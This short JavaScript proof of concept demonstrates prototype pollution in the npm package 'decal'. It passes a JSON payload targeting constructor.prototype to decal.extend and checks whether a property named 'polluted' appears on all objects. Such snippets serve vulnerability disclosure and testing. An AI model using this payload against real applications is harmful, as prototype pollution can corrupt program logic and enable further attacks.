var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
decal.extend(obj, true, o);
console.log({}.polluted);